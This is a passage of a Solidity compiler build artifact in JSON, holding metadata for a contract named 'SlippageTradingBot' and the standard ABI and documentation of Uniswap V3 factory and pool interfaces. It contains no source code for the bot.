					"metadata": "{\"compiler\":{\"version\":\"0.8.20+commit.a1b79de6\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"name\":\"Log\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"Start\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Stop\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Withdrawal\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"result\",\"type\":\"string\"}],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"checkLiquidity\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/tradingbot.sol\":\"SlippageTradingBot\"},\"evmVersion\":\"shanghai\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/tradingbot.sol\":{\"keccak256\":\"0x06ff375a2d945fb9d9020f82863ad5a288cf90bb16094e6456ea80a2b4d9aaf5\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://518012dbbe1ab8fa7bb3423966ec4d19e46eca0d06078baa2b15a1cc5bb2558d\",\"dweb:/ipfs/QmdHhjsFef9wGauLNoEW3BwtnEx3aiLNGuuAALQUq2XbDf\"]},\"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol\":{\"keccak256\":\"0xcc3d0c93fc9ac0febbe09f941b465b57f750bcf3b48432da0b97dc289cfdc489\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://b9379ad954680c44a0bc523b314ae4c4da735f9fe1d02aa56ea5bdba6f1136f2\",\"dweb:/ipfs/QmZXdgQNXKAckrXWz9R3mc47F1fvDvr28a2ewJrwNAw71B\"]},\"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol\":{\"keccak256\":\"0xfe6113d518466cd6652c85b111e01f33eb62157f49ae5ed7d5a3947a2044adb1\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://1c42b9e6f5902ac38dd43e25750939baa7e0c1425dc75afd717c4412731065d5\",\"dweb:/ipfs/QmWaoacnzsucTvBME2o7YgZBZMhaHv7fkj83htHMVWJKWh\"]},\"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol\":{\"keccak256\":\"0x9453dd0e7442188667d01d9b65de3f1e14e9511ff3e303179a15f6fc267f7634\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://982f4328f956c3e60e67501e759eb292ac487f76460c774c50e9ae4fcc92aae5\",\"dweb:/ipfs/QmRnzEDsaqtd9PJEVcgQi7p5aV5pMSvRUoGZJAdwFUJxgZ\"]},\"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol\":{\"keccak256\":\"0xe603ac5b17ecdee73ba2b27efdf386c257a19c14206e87eee77e2017b742d9e5\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://8febc9bdb399a4d94bb89f5377732652e2400e4a8dee808201ade6848f9004e7\",\"dweb:/ipfs/QmaKDqYYFU4d2W2iN77aDHptfbFmYZRrMYXHeGpJmM8C1c\"]},\"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol\":{\"keccak256\":\"0x8071514d0fe5d17d6fbd31c191cdfb703031c24e0ece3621d88ab10e871375cd\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://d0b571930cc7488b1d546a7e9cea7c52d8b3c4e207da657ed0e0db7343b8cd03\",\"dweb:/ipfs/QmaGK6vVwB95QSTR1XMYvrh7ivYAYZxi3fD7v6VMA4jZ39\"]},\"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol\":{\"keccak256\":\"0xf6e5d2cd1139c4c276bdbc8e1d2b256e456c866a91f1b868da265c6d2685c3f7\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://b99c8c9ae8e27ee6559e5866bea82cbc9ffc8247f8d15b7422a4deb287d4d047\",\"dweb:/ipfs/QmfL8gaqt3ffAnm6nVj5ksuNpLygXuL3xq5VBqrkwC2JJ3\"]},\"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol\":{\"keccak256\":\"0x759b78a2918af9e99e246dc3af084f654e48ef32bb4e4cb8a966aa3dcaece235\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://64144fb96e1c7fdba87305acadb98a198d26a3d46c097cb3a666e567f6f29735\",\"dweb:/ipfs/QmUnWVwN9FKB9uV5Pr8YfLpWZnYM2DENnRMaadZ492JS9u\"]},\"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol\":{\"keccak256\":\"0x852dc1f5df7dcf7f11e7bb3eed79f0cea72ad4b25f6a9d2c35aafb48925fd49f\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://ed63907c38ff36b0e22bc9ffc53e791ea74f0d4f0e7c257fdfb5aaf8825b1f0f\",\"dweb:/ipfs/QmSQrckghEjs6HVsA5GVgpNpZWvTXMY5eQLF7cN6deFeEg\"]},\"https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol\":{\"keccak256\":\"0xd53041349718d5bce4a89e87cd911879d41ba42ba3fab0614e5e8b742f352b88\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://ea7529b99ab4fc1d3e6c5a31990fb688f0a2d6cc302c0419e0cf5a2d6c563781\",\"dweb:/ipfs/QmVaphRSNpfChHZKzutQ9WprwCo2WE1euvThRfHcwsnHhj\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 6,
								"contract": "contracts/tradingbot.sol:SlippageTradingBot",
								"label": "liquidity",
								"offset": 0,
								"slot": "0",
								"type": "t_uint256"
							}
						],
						"types": {
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			},
			"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol": {
				"IUniswapV3Factory": {
					"abi": [
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "uint24",
									"name": "fee",
									"type": "uint24"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickSpacing",
									"type": "int24"
								}
							],
							"name": "FeeAmountEnabled",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "oldOwner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "newOwner",
									"type": "address"
								}
							],
							"name": "OwnerChanged",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "token0",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "token1",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "uint24",
									"name": "fee",
									"type": "uint24"
								},
								{
									"indexed": false,
									"internalType": "int24",
									"name": "tickSpacing",
									"type": "int24"
								},
								{
									"indexed": false,
									"internalType": "address",
									"name": "pool",
									"type": "address"
								}
							],
							"name": "PoolCreated",
							"type": "event"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "tokenA",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "tokenB",
									"type": "address"
								},
								{
									"internalType": "uint24",
									"name": "fee",
									"type": "uint24"
								}
							],
							"name": "createPool",
							"outputs": [
								{
									"internalType": "address",
									"name": "pool",
									"type": "address"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint24",
									"name": "fee",
									"type": "uint24"
								},
								{
									"internalType": "int24",
									"name": "tickSpacing",
									"type": "int24"
								}
							],
							"name": "enableFeeAmount",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint24",
									"name": "fee",
									"type": "uint24"
								}
							],
							"name": "feeAmountTickSpacing",
							"outputs": [
								{
									"internalType": "int24",
									"name": "",
									"type": "int24"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "tokenA",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "tokenB",
									"type": "address"
								},
								{
									"internalType": "uint24",
									"name": "fee",
									"type": "uint24"
								}
							],
							"name": "getPool",
							"outputs": [
								{
									"internalType": "address",
									"name": "pool",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "owner",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_owner",
									"type": "address"
								}
							],
							"name": "setOwner",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"events": {
							"FeeAmountEnabled(uint24,int24)": {
								"params": {
									"fee": "The enabled fee, denominated in hundredths of a bip",
									"tickSpacing": "The minimum number of ticks between initialized ticks for pools created with the given fee"
								}
							},
							"OwnerChanged(address,address)": {
								"params": {
									"newOwner": "The owner after the owner was changed",
									"oldOwner": "The owner before the owner was changed"
								}
							},
							"PoolCreated(address,address,uint24,int24,address)": {
								"params": {
									"fee": "The fee collected upon every swap in the pool, denominated in hundredths of a bip",
									"pool": "The address of the created pool",
									"tickSpacing": "The minimum number of ticks between initialized ticks",
									"token0": "The first token of the pool by address sort order",
									"token1": "The second token of the pool by address sort order"
								}
							}
						},
						"kind": "dev",
						"methods": {
							"createPool(address,address,uint24)": {
								"details": "tokenA and tokenB may be passed in either order: token0/token1 or token1/token0. tickSpacing is retrieved from the fee. The call will revert if the pool already exists, the fee is invalid, or the token arguments are invalid.",
								"params": {
									"fee": "The desired fee for the pool",
									"tokenA": "One of the two tokens in the desired pool",
									"tokenB": "The other of the two tokens in the desired pool"
								},
								"returns": {
									"pool": "The address of the newly created pool"
								}
							},
							"enableFeeAmount(uint24,int24)": {
								"details": "Fee amounts may never be removed once enabled",
								"params": {
									"fee": "The fee amount to enable, denominated in hundredths of a bip (i.e. 1e-6)",
									"tickSpacing": "The spacing between ticks to be enforced for all pools created with the given fee amount"
								}
							},
							"feeAmountTickSpacing(uint24)": {
								"details": "A fee amount can never be removed, so this value should be hard coded or cached in the calling context",
								"params": {
									"fee": "The enabled fee, denominated in hundredths of a bip. Returns 0 in case of unenabled fee"
								},
								"returns": {
									"_0": "The tick spacing"
								}
							},
							"getPool(address,address,uint24)": {
								"details": "tokenA and tokenB may be passed in either token0/token1 or token1/token0 order",
								"params": {
									"fee": "The fee collected upon every swap in the pool, denominated in hundredths of a bip",
									"tokenA": "The contract address of either token0 or token1",
									"tokenB": "The contract address of the other token"
								},
								"returns": {
									"pool": "The pool address"
								}
							},
							"owner()": {
								"details": "Can be changed by the current owner via setOwner",
								"returns": {
									"_0": "The address of the factory owner"
								}
							},
							"setOwner(address)": {
								"details": "Must be called by the current owner",
								"params": {
									"_owner": "The new owner of the factory"
								}
							}
						},
						"title": "The interface for the Uniswap V3 Factory",
						"version": 1
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"createPool(address,address,uint24)": "a1671295",
							"enableFeeAmount(uint24,int24)": "8a7c195f",
							"feeAmountTickSpacing(uint24)": "22afcccb",
							"getPool(address,address,uint24)": "1698ee82",
							"owner()": "8da5cb5b",
							"setOwner(address)": "13af4035"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.20+commit.a1b79de6\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"uint24\",\"name\":\"fee\",\"type\":\"uint24\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickSpacing\",\"type\":\"int24\"}],\"name\":\"FeeAmountEnabled\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"oldOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnerChanged\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"token0\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"token1\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint24\",\"name\":\"fee\",\"type\":\"uint24\"},{\"indexed\":false,\"internalType\":\"int24\",\"name\":\"tickSpacing\",\"type\":\"int24\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"pool\",\"type\":\"address\"}],\"name\":\"PoolCreated\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenA\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenB\",\"type\":\"address\"},{\"internalType\":\"uint24\",\"name\":\"fee\",\"type\":\"uint24\"}],\"name\":\"createPool\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"pool\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint24\",\"name\":\"fee\",\"type\":\"uint24\"},{\"internalType\":\"int24\",\"name\":\"tickSpacing\",\"type\":\"int24\"}],\"name\":\"enableFeeAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint24\",\"name\":\"fee\",\"type\":\"uint24\"}],\"name\":\"feeAmountTickSpacing\",\"outputs\":[{\"internalType\":\"int24\",\"name\":\"\",\"type\":\"int24\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenA\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenB\",\"type\":\"address\"},{\"internalType\":\"uint24\",\"name\":\"fee\",\"type\":\"uint24\"}],\"name\":\"getPool\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"pool\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"setOwner\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"events\":{\"FeeAmountEnabled(uint24,int24)\":{\"params\":{\"fee\":\"The enabled fee, denominated in hundredths of a bip\",\"tickSpacing\":\"The minimum number of ticks between initialized ticks for pools created with the given fee\"}},\"OwnerChanged(address,address)\":{\"params\":{\"newOwner\":\"The owner after the owner was changed\",\"oldOwner\":\"The owner before the owner was changed\"}},\"PoolCreated(address,address,uint24,int24,address)\":{\"params\":{\"fee\":\"The fee collected upon every swap in the pool, denominated in hundredths of a bip\",\"pool\":\"The address of the created pool\",\"tickSpacing\":\"The minimum number of ticks between initialized ticks\",\"token0\":\"The first token of the pool by address sort order\",\"token1\":\"The second token of the pool by address sort order\"}}},\"kind\":\"dev\",\"methods\":{\"createPool(address,address,uint24)\":{\"details\":\"tokenA and tokenB may be passed in either order: token0/token1 or token1/token0. tickSpacing is retrieved from the fee. The call will revert if the pool already exists, the fee is invalid, or the token arguments are invalid.\",\"params\":{\"fee\":\"The desired fee for the pool\",\"tokenA\":\"One of the two tokens in the desired pool\",\"tokenB\":\"The other of the two tokens in the desired pool\"},\"returns\":{\"pool\":\"The address of the newly created pool\"}},\"enableFeeAmount(uint24,int24)\":{\"details\":\"Fee amounts may never be removed once enabled\",\"params\":{\"fee\":\"The fee amount to enable, denominated in hundredths of a bip (i.e. 1e-6)\",\"tickSpacing\":\"The spacing between ticks to be enforced for all pools created with the given fee amount\"}},\"feeAmountTickSpacing(uint24)\":{\"details\":\"A fee amount can never be removed, so this value should be hard coded or cached in the calling context\",\"params\":{\"fee\":\"The enabled fee, denominated in hundredths of a bip. Returns 0 in case of unenabled fee\"},\"returns\":{\"_0\":\"The tick spacing\"}},\"getPool(address,address,uint24)\":{\"details\":\"tokenA and tokenB may be passed in either token0/token1 or token1/token0 order\",\"params\":{\"fee\":\"The fee collected upon every swap in the pool, denominated in hundredths of a bip\",\"tokenA\":\"The contract address of either token0 or token1\",\"tokenB\":\"The contract address of the other token\"},\"returns\":{\"pool\":\"The pool address\"}},\"owner()\":{\"details\":\"Can be changed by the current owner via setOwner\",\"returns\":{\"_0\":\"The address of the factory owner\"}},\"setOwner(address)\":{\"details\":\"Must be called by the current owner\",\"params\":{\"_owner\":\"The new owner of the factory\"}}},\"title\":\"The interface for the Uniswap V3 Factory\",\"version\":1},\"userdoc\":{\"events\":{\"FeeAmountEnabled(uint24,int24)\":{\"notice\":\"Emitted when a new fee amount is enabled for pool creation via the factory\"},\"OwnerChanged(address,address)\":{\"notice\":\"Emitted when the owner of the factory is changed\"},\"PoolCreated(address,address,uint24,int24,address)\":{\"notice\":\"Emitted when a pool is created\"}},\"kind\":\"user\",\"methods\":{\"createPool(address,address,uint24)\":{\"notice\":\"Creates a pool for the given two tokens and fee\"},\"enableFeeAmount(uint24,int24)\":{\"notice\":\"Enables a fee amount with the given tickSpacing\"},\"feeAmountTickSpacing(uint24)\":{\"notice\":\"Returns the tick spacing for a given fee amount, if enabled, or 0 if not enabled\"},\"getPool(address,address,uint24)\":{\"notice\":\"Returns the pool address for a given pair of tokens and a fee, or address 0 if it does not exist\"},\"owner()\":{\"notice\":\"Returns the current owner of the factory\"},\"setOwner(address)\":{\"notice\":\"Updates the owner of the factory\"}},\"notice\":\"The Uniswap V3 Factory facilitates creation of Uniswap V3 pools and control over the protocol fees\",\"version\":1}},\"settings\":{\"compilationTarget\":{\"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol\":\"IUniswapV3Factory\"},\"evmVersion\":\"shanghai\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol\":{\"keccak256\":\"0xcc3d0c93fc9ac0febbe09f941b465b57f750bcf3b48432da0b97dc289cfdc489\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://b9379ad954680c44a0bc523b314ae4c4da735f9fe1d02aa56ea5bdba6f1136f2\",\"dweb:/ipfs/QmZXdgQNXKAckrXWz9R3mc47F1fvDvr28a2ewJrwNAw71B\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"events": {
							"FeeAmountEnabled(uint24,int24)": {
								"notice": "Emitted when a new fee amount is enabled for pool creation via the factory"
							},
							"OwnerChanged(address,address)": {
								"notice": "Emitted when the owner of the factory is changed"
							},
							"PoolCreated(address,address,uint24,int24,address)": {
								"notice": "Emitted when a pool is created"
							}
						},
						"kind": "user",
						"methods": {
							"createPool(address,address,uint24)": {
								"notice": "Creates a pool for the given two tokens and fee"
							},
							"enableFeeAmount(uint24,int24)": {
								"notice": "Enables a fee amount with the given tickSpacing"
							},
							"feeAmountTickSpacing(uint24)": {
								"notice": "Returns the tick spacing for a given fee amount, if enabled, or 0 if not enabled"
							},
							"getPool(address,address,uint24)": {
								"notice": "Returns the pool address for a given pair of tokens and a fee, or address 0 if it does not exist"
							},
							"owner()": {
								"notice": "Returns the current owner of the factory"
							},
							"setOwner(address)": {
								"notice": "Updates the owner of the factory"
							}
						},
						"notice": "The Uniswap V3 Factory facilitates creation of Uniswap V3 pools and control over the protocol fees",
						"version": 1
					}
				}
			},
			"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol": {
				"IUniswapV3Pool": {
					"abi": [
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"name": "Burn",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount0",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount1",
									"type": "uint128"
								}
							],
							"name": "Collect",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount0",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount1",
									"type": "uint128"
								}
							],
							"name": "CollectProtocol",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "paid0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "paid1",
									"type": "uint256"
								}
							],
							"name": "Flash",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "uint16",
									"name": "observationCardinalityNextOld",
									"type": "uint16"
								},
								{
									"indexed": false,
									"internalType": "uint16",
									"name": "observationCardinalityNextNew",
									"type": "uint16"
								}
							],
							"name": "IncreaseObservationCardinalityNext",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "uint160",
									"name": "sqrtPriceX96",
									"type": "uint160"
								},
								{
									"indexed": false,
									"internalType": "int24",
									"name": "tick",
									"type": "int24"
								}
							],
							"name": "Initialize",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"name": "Mint",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "uint8",
									"name": "feeProtocol0Old",
									"type": "uint8"
								},
								{
									"indexed": false,
									"internalType": "uint8",
									"name": "feeProtocol1Old",
									"type": "uint8"
								},
								{
									"indexed": false,
									"internalType": "uint8",
									"name": "feeProtocol0New",
									"type": "uint8"
								},
								{
									"indexed": false,
									"internalType": "uint8",
									"name": "feeProtocol1New",
									"type": "uint8"
								}
							],
							"name": "SetFeeProtocol",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "int256",
									"name": "amount0",
									"type": "int256"
								},
								{
									"indexed": false,
									"internalType": "int256",
									"name": "amount1",
									"type": "int256"
								},
								{
									"indexed": false,
									"internalType": "uint160",
									"name": "sqrtPriceX96",
									"type": "uint160"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "liquidity",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "int24",
									"name": "tick",
									"type": "int24"
								}
							],
							"name": "Swap",
							"type": "event"
						},
						{
							"inputs": [
								{
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"internalType": "uint128",
									"name": "amount",
									"type": "uint128"
								}
							],
							"name": "burn",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"internalType": "uint128",
									"name": "amount0Requested",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "amount1Requested",
									"type": "uint128"
								}
							],
							"name": "collect",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "amount0",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "amount1",
									"type": "uint128"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "uint128",
									"name": "amount0Requested",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "amount1Requested",
									"type": "uint128"
								}
							],
							"name": "collectProtocol",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "amount0",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "amount1",
									"type": "uint128"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "factory",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "fee",
							"outputs": [
								{
									"internalType": "uint24",
									"name": "",
									"type": "uint24"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "feeGrowthGlobal0X128",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "feeGrowthGlobal1X128",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								},
								{
									"internalType": "bytes",
									"name": "data",
									"type": "bytes"
								}
							],
							"name": "flash",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint16",
									"name": "observationCardinalityNext",
									"type": "uint16"
								}
							],
							"name": "increaseObservationCardinalityNext",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint160",
									"name": "sqrtPriceX96",
									"type": "uint160"
								}
							],
							"name": "initialize",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "liquidity",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "",
									"type": "uint128"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "maxLiquidityPerTick",
							"outputs": [
